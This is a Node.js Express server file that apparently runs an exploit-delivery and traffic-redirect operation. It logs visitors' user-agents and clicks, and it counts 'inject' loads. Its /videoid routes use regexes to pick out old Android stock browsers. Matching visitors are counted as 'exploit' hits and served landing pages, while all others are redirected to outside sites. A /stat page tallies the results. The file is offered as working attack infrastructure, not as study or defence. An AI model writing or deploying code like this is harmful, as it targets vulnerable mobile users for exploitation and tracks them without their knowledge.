var express = require('express');
var fs		= require('fs');
var app     = express();
var hbs 	= require('handlebars');

global.root	= __dirname+"/";
var http 	= require('http').Server(app);
var io  	= require('./system/iosettings')(http);

//var tpl			= fs.readFileSync(root+'template/stats.hbs',"utf8");

var exploit 	= 0;
var tototo 		= 0;
var click 		= 0;
var errr 		= 0;
var inj_load 	= 0;


var users = {};
const root = __dirname+"/";

app.use(express.static('public'));

app.get('/stat', function(req, res){

	html = "<table  border='1' cellspacing='0' cellpadding='5'>";
	Object.keys(users).forEach(function(id){
		html +="<tr><td>"+users[id].sec+"</td><td>"+users[id].agent+"</td><td>"+users[id].click+"</td><td>"+users[id].inject+"</td></tr>";
	});
	html += "</table>"


	res.send('exploit:       '+exploit+"        toto:"+tototo+"       click:"+click+"           inj_load:"+inj_load+" <br>"+ html);
});


app.get('/', function(req, res){
	res.sendFile(root+'template/index.html');
});
app.get('/errr', function(req, res){
	errr++;
	res.send('1');
});


app.get('/inj_loadid=:id', function(req, res){
	console.log("INJECT:"+req.headers["user-agent"]);
	
	users[req.params.id].inject = true;
	users[req.params.id].agent = req.headers["user-agent"];

	inj_load++;
	res.send('1');
});

app.get('/clickid=:id', function(req, res){
	try{

	users[String(req.params.id)].click = true;
	users[String(req.params.id)].agent = req.headers["user-agent"];
}catch (err){
	users[req.params.id]= {
			sec:req.params.sec,
			agent:req.headers["user-agent"],
			click:true,
			inject:false
		};
}

	click++;
	res.send('1');
});

app.get('/test', function(req, res){
	res.sendFile(root+'template/lend.html');
});

app.get('/test2', function(req, res){
	res.sendFile(root+'template/lend_bee_noadalt.html');
});

function timerOnSite(id,sec,agent){
	if (users[id]){
		users[id].sec = sec;
	}else{

		users[id]= {
			sec:sec,
			agent:agent,
			click:false,
			inject:false
		};
	}
}


app.get('/timmerid=:id&sec=:sec', function(req, res){
	timerOnSite(req.params.id,req.params.sec,req.headers["user-agent"])
	res.send('1');
});





app.get('/videoid=512312451', function(req, res){
//res.redirect("http://avr-start.ru/");
//return;

	console.log(req.headers['user-agent']);
	var agent = req.headers["user-agent"];
	

	//if (agent.match(/Android [1,2,3,4].[1,2,3,4].[1,2,3,4,5,6,7,8]/)&&agent.match(/Version\/[4,3,2,1].[3,2,1,0] Mobile Safari/)){
	if (false){	
		exploit++;
		console.log("EXPLOIIIIITTT");
		res.sendFile(root+'template/lend.html');
	}else {
		tototo++;
		res.redirect("http://7dga.biz/?k=3302");
	}

//res.send("boo")
//  res.sendFile(root+'template/index.html');
});

app.get('/videoid=4455', function(req, res){
	console.log(req.headers['user-agent']);
	var agent = req.headers["user-agent"];
	

	if (agent.match(/Android [1,2,3,4].[1,2,3,4].[1,2,3,4,5,6,7,8]/)&&agent.match(/Version\/[4,3,2,1].[3,2,1,0] Mobile Safari/)){
		
		exploit++;
		console.log("EXPLOIIIIITTT");
		res.sendFile(root+'template/lend_bee_noadalt.html');
	}else {
		tototo++;
		res.redirect("http://provideostroy.ru/-4DFZ_vvJM/");
	}


});



http.listen(8090, function(){
	console.log('listening on *:3000');
});
